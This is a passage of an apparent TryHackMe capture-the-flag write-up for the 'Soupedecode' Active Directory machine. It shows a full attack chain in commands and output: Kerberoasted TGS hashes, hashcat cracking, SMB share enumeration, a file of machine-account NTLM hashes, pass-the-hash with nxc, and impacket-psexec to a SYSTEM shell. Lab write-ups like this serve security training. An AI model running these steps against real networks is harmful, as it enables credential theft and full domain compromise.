e7b2a050aad439c6b592907c7a2981d489afcdb5b83d6d397f29006a8b90b868d9ea2ef090a303e7540304919bef1ed45293068b556c2814c773f4c3bf2912a67eb628e248fda483060f30bec97d0c5626c2ab07ac1da9b406d13e2744045189d64afc87e2c41eeca7acc1ebca99207cc9c8fbedea2bf832475e7320fc4ee5ef89bbf326e32a7c575990486b0a96938cf375a99e89f0118be6854c0cf7bbbc4ec4fc5ffe8431da9c6feaccee33a607cd52bc6b211af92579ce7f7a27beee2ce29e51ebfe01b4cd5fb8f12e065a7c42fa30dfacce33ea9313b85c2b8b04ab91e8989626d74630ffb019e77ef0f7c2674ee9624fe359a837344baf6d7eeed76cdefcf05012a84f16f195c68dca72b3599275354ef56626842d041a1143c21e80df06f1b3096433ccc7c4f12d1fc8808ff6e04fea99c496714c
$krb5tgs$23$*monitoring_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/monitoring_svc*$b548b6dfeacb467873da40f41225d59c$a9cc424e13cf981cd17074efce8f6450bac1b266dd308fda7c515aad7af64ab1e28fef44d0f184c5f90199ab62f40511bc48583802a4b011af368a8b565a6256768062b21a95d44a7c86a37e169a6f62fad640dd888fd76b95e7554bc30dffc2c19f47f7fef4134108d0bfaf0d2a8fc725f747167ccf847559ed075a766ec511347b562828e1da3ab90eb7a705b6388b4925d44b4f91b7f29ff097c7d616a8af718e368cba63cd5dfa22df41ffe5b1ee596949f86b5b7ccd9696a3947a8fb1bfa04f67c9c235aa8f4e795f2b85a7c088ff28d60d408ccb24c0e99935341cadc3357c5c54f06be752422176bc6920172a3848d85359a95699ecbd63511212985b2944293d2fffcbf8a5a8a25799df500a4a90b973004ceb08d5b2744b3ae3b68a002cde6ca95bad071c48c43bb93a5efd9770dc23117184a05f8d597aa31d24cff9c9ac27de4d403dd3cf45f25e028f5d5efa73920d3e1100ae5f5c8f68f9fbd7362c5cf235d3fa53c9958b5799d2acfbbff95a8d78b77ca55fa6f447e637fdf1bb5e9472822b15c592a3eba826b01eaaeab4e5725a6345d109470d0fd1d1c751364e0fec04d6537f7303fc14d128e127f6364e1c4c4a2259a8a9347bf5cd5212b5af60cc5ab7d015cdaeab3916d7ed86f9ce0d3db1036e855b5b71de2492cd78a495075d470770e29b339892f094f2256154d139c1552e9525df2495e3f2d54a042c49acca4789dfc5dcfb3cc5dfd1678020d84b51b9a55c096e6342bd32ec9e96d0d9516e7539a6c4e06506e934504f87c457c438699c88b43444f85b369ecd0382dc3794e027eda3fd2b62726ec7bfcbf826e11ea49571bc982ca10617b7c43c4439e08069b955bef6612e4176a9438928b4376d3ddb5ae9f67c0c8f3b7ddc83c571d5fc711193c2dc206f3bae3bbe23786879a5b056abf1aeef14ac0138d2ecfc5a71e5489dd0caaf64ffb8258e5a522ba85b6adf9b77dec1b77945b8c331239137c8dd52cbea2bb702e696b811d1a6e0fed4a1695aa84d11e9504766f8cb0d3a304c201d4090effc12981f854b5d50d478cfe70c7f88e5e3b6c5c3027ccd77512e521d4efd8455cb21214bbe79ab55eee16f8ce9a72bc3734b132bc7d8d1404a11e870445cd7e42b5d059b981f129d0d13cf2bd53116e76c2a24d9ec6c5e5b01fed3336e72fd221868da25ac336fd50bd9dc3a772936e78ac1d5e546d12b39e0536241437b971415691dad0058cca36ec358e6a4afc94c9ee4ec37589551add99fed11c9e5d24178888257d19d0ff79997e10a497bcd0bf272d56fd4ee24110e221fa09834194d9230a5b57e14878955eb03c368bc50a0d5f814b54f066c8a20557ed6305a1447cda6aaca1fe2433195c2b320bb11b7fa121c16612194eab18ec67eee78a082f3e07e3473c040d710acc0ee922d2e9db931f854b5b044a9c5ba12e46067d3292de8ae90039a1c3357d9f9509f78e55baf135a49619590ba62

```

we got five service accounts, lets attempt to crack the tgs 

```bash
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt --show
$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/file_svc*$370a698101c515f883685d182ec0f10a$4e01ab2c402ce55961a825120f356766326419ce81c2974e0b45fee6602743ffecb5454de393b670f1dfe8caba13395ee8999ab6657f301daec38988965fb5197e8b90c2f8d8e095147bfd2a0d03ded773f3f1f12d0a05c41eb7962cdfb45a70c6dd64d72cd382dcd4c7a627f55546000e46a2f588d8acad80d913beee30439086e865cc1d260c7f307af1da1322bbf9264c4672d3a70bf046f94a09fb4286119eb5783470bae7d4f7a84c113d1c75f07b5640d56065a4e62cc70d54690b02744983f982bf30deffe785778e6e75aa4e554a12bd0fb1e86f9c0c1b53758d2663085846b335f953b16c6751ea9dbe48728f7f28ceb9a9c46a25f5fa060a00ee9db0173d5043df84565cefdb32a2254bd34ead8b6d122f450a9d354bca2cc8decf42854ffe20023e649afbb4271785a1560e2333d63408015ce48b973aa4f8ff265d5678dfbe771d2a3cbe5fde7ba5fd9bb129b7c202c343f7ebae722667d6a5bfe35f62ad2bbe0f5fa0a6fdfb8921b83534da93fb91c3f42eac979473d274c9edd013ddc74f2ce72ffe1609a62f648820ebe74f60d6f1b12bf449e69d036ebc7d253fb27553485dbbe9654da26e7941ea4fa0e88a864c23c07366a441ac66367006f708167deeeb99d06ae7c90c133c92fdc107a7a6a5ceda88ff3f579cc623a7454be086e2b50058a489466740f0999b4a26da03e94f31fe693547b75aaf2b11cebf2e86d779906d5edde67c9bfcfc96af90f52f945d0cb4bed9c2b41a735d8eaf795d3adea28ff78b856799682d43b668c46e2a90760d1d076f2539ade1325069418238dacf918571d90cb1c6529e482fa926ba4fc6875ad64992087ba53d9fb657797cd2dad963aeb96a44a0cd3621f48f4632284db3477dc8fb0b62fff39a61a0c8c7a267a3496bb5a1227a0d7631196bf8e9f132146dbe628ae03d4f02dcbb423379ebc71059f94e5b35a04fa19a9c3e905361826f63a814c81c76f457d15489f86ceaf6fd92134fdd319f65b2f4d8c2d56e37e9cedc10063e0c7ff5dd1b713145afbe6f923135bb2e766c57cbf6ee9d932608031d6d5357f0c81956a88b48730e2cc28f190345630483737de29856ff38b01c75574651551a5505801a091354e8a20675b3dad2388d106e732ab390abb510ebaadc2f4781ad2cf60c3c84d4a25e4f9c17ed5df6589c9f64c606f695c17cae97bcc536437efb6ff16146bcc187e822ce768f80b771a18a891220363f9fdef2dddf69bc56804e0b96c1a820a20f54612472fb25bc282398cb4d047ac6e08bf76bb31bab5ce6a248bd79862cdb8a4aa6f8d48c6d4d111104e29539a3d08b246f06d0fb9edf813531c1b6cad4cc9d2840ad8270dbb011a0c122d7142355d8f63fba283dc77dc42aae435c92e0ca906771e933bbbc77e1eff1b294246f4bc951693a7361779d8536a4805d521e217205610bb0175271086d3e4e821524896974fe21eed7a82769affaa924cf39bd:Password123!!

```

successfully cracked `file_svc` tgs

> file_svc:Password123!!

#### SMB recon

```bash
┌──(darklight㉿jinx)-[~/Documents/ctf/thm/Soupedecode]
└─$ nxc smb DC01.SOUPEDECODE.LOCAL -u file_svc -p 'Password123!!' --shares
SMB         10.10.77.80     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.77.80     445    DC01             [+] SOUPEDECODE.LOCAL\file_svc:Password123!! 
SMB         10.10.77.80     445    DC01             [*] Enumerated shares
SMB         10.10.77.80     445    DC01             Share           Permissions     Remark
SMB         10.10.77.80     445    DC01             -----           -----------     ------
SMB         10.10.77.80     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.77.80     445    DC01             backup          READ            
SMB         10.10.77.80     445    DC01             C$                              Default share
SMB         10.10.77.80     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.77.80     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.77.80     445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.77.80     445    DC01             Users                           
                                                                                                                                                  
┌──(darklight㉿jinx)-[~/Documents/ctf/thm/Soupedecode]
└─$ nxc smb DC01.SOUPEDECODE.LOCAL -u ybob317 -p ybob317 --shares
                                                                                                                                                  
┌──(darklight㉿jinx)-[~/Documents/ctf/thm/Soupedecode]
└─$ nxc smb DC01.SOUPEDECODE.LOCAL -u ybob317 -p ybob317 --shares
SMB         10.10.77.80     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.77.80     445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 
SMB         10.10.77.80     445    DC01             [*] Enumerated shares
SMB         10.10.77.80     445    DC01             Share           Permissions     Remark
SMB         10.10.77.80     445    DC01             -----           -----------     ------
SMB         10.10.77.80     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.77.80     445    DC01             backup                          
SMB         10.10.77.80     445    DC01             C$                              Default share
SMB         10.10.77.80     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.77.80     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.77.80     445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.77.80     445    DC01             Users           READ          
```

with `file_svc` account we have read access to the `backup` share and with `ybob317` we have access to `Users` share.

Based on the challenge description, the only attack that we haven't performed so far is `pth (pass-the-hash)` so where exactly do we get a hash ??

##### Backup share

we have a `.txt` file 

```bash
smbclient \\\\10.10.77.80\\backup -U 'file_svc'
Password for [WORKGROUP\file_svc]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jun 17 20:41:17 2024
  ..                                 DR        0  Fri Jul 25 20:51:20 2025
  backup_extract.txt                  A      892  Mon Jun 17 11:41:05 2024

		12942591 blocks of size 4096. 10602348 blocks available
smb: \> get backup_extract.txt 
getting file \backup_extract.txt of size 892 as backup_extract.txt (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)
smb: \> 

```

```bash
cat backup_extract.txt                                          
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::

```

##### PTH 

extract the computer account names and the NTLM hashes

```bash
┌──(darklight㉿jinx)-[~/Documents/ctf/thm/Soupedecode]
└─$ cat backup_extract.txt | cut -d ':' -f 1 > comp-accounts.txt
                      
┌──(darklight㉿jinx)-[~/Documents/ctf/thm/Soupedecode]
└─$ cat backup_extract.txt | cut -d ':' -f 4 > comp-account-hashes.txt

```

Verifying the credentials we get one one account

```bash
nxc smb DC01.SOUPEDECODE.LOCAL -u comp-accounts.txt -H comp-account-hashes.txt --no-brute --continue-on-success
SMB         10.10.77.80     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\WebServer$:c47b45f5d4df5a494bd19f13e14f7902 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\DatabaseServer$:406b424c7b483a42458bf6f545c936f7 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\CitrixServer$:48fc7eca9af236d7849273990f6c5117 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\MailServer$:46a4655f18def136b3bfab7b0b4e70e3 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\BackupServer$:46a4655f18def136b3bfab7b0b4e70e3 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\ApplicationServer$:8cd90ac6cba6dde9d8038b068c17e9f5 STATUS_LOGON_FAILURE
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\PrintServer$:b8a38c432ac59ed00b2a373f4f050d28 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\ProxyServer$:4e3f0bb3e5b6e3e662611b1a87988881 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\MonitoringServer$:48fc7eca9af236d7849273990f6c5117 STATUS_LOGON_FAILURE
```

> SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)

> **GAME OVER !!** (Pwn3d!) means we have administrator privileges in the target system. 

```bash
impacket-psexec 'SOUPEDECODE.LOCAL/FileServer$'@10.10.77.80 -hashes :e41da7e79a4c76dbd9cf79d1cb325559                    
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.77.80.....
[*] Found writable share ADMIN$
[*] Uploading file LvsmpAhE.exe
[*] Opening SVCManager on 10.10.77.80.....
[*] Creating service nbAe on 10.10.77.80.....
[*] Starting service nbAe.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.587]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

```

*Challenge completed in 1hr 57mins*


